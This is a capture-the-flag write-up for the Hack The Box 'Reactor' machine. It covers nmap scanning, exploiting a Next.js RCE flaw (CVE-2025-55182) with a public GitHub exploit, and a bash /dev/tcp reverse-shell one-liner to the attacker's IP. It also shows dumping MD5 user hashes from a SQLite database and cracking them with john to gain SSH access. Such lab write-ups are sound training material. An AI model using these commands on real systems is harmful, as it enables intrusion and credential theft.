# Hack The Box: Reactor 

### Challenge Name: Reactor 
**Difficulty:** Easy

<img width="711" height="224" alt="image" src="https://github.com/user-attachments/assets/ce860b70-432e-4325-b719-716614affaf6" />


## Writeup:

To start, I ran nmap on the ip address to see what ports were exposed:

`snmap -sV 10.129.14.149`

<img width="800" height="320" alt="image" src="https://github.com/user-attachments/assets/de3b41d5-0b2d-4b7b-a87e-1a9d56009b4e" />

We see that the server supports ssh and some service on 3000. After some investigation, I found that port 3000 was hosting the webserver

<img width="1922" height="1019" alt="image" src="https://github.com/user-attachments/assets/e9b37e86-c4bd-4d1a-95ce-f5772a8d47d1" />

The website did not have any obvious user input like a login page or input boxes... the page was static.
I used Wappalyzer and saw that the it was using `Next.js 15.0.3` 

<img width="572" height="564" alt="image" src="https://github.com/user-attachments/assets/a12d4f0f-6687-40db-bbd5-35db71091493" />

This version is vulnerable to multiple CVEs, the one I used for `CVE-2025-55182`. multiple exploits on github can be found, the one that worked for me was 
`https://github.com/cybertechajju/R2C-CVE-2025-55182-66478/tree/main`

This exploit gives me RCE and I used this to spawn a reverse shell. 

```bash exploits/scanner_advanced.sh -d http://10.129.14.149:3000/ -c "bash -c 'bash -i >& /dev/tcp/10.10.14.165/4444 0>&1'"```

<img width="990" height="689" alt="image" src="https://github.com/user-attachments/assets/90f4456e-4791-4a8d-be33-d5ff2238d86d" />

<img width="702" height="451" alt="image" src="https://github.com/user-attachments/assets/d101f476-979f-4617-92e0-3fb5b0666444" />

from `/etc/passwd` I was able to pull out the user account `engineer`. Now we just need to find the password.

One thing that I saw was the `reactor.db` file. With this I was able to pull out some account data with the query 

```sqlite3 reactor.db "SELECT * FROM users;"```



```
node@reactor:/opt/reactor-app$ sqlite3 reactor.db "SELECT * FROM users;"                                                      
sqlite3 reactor.db "SELECT * FROM users;"                                                                                     
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb                                                      
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

I cracked the engineering password with john and gor `reactor1` as the password

<img width="860" height="212" alt="image" src="https://github.com/user-attachments/assets/fc8ffae5-d956-4e00-8c7c-35662b1c0b6b" />


```john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt```

I was successfully able to log into the engineer's ssh account.

<img width="650" height="437" alt="image" src="https://github.com/user-attachments/assets/ab1a66d0-090b-42e6-b857-4645abf2fe92" />


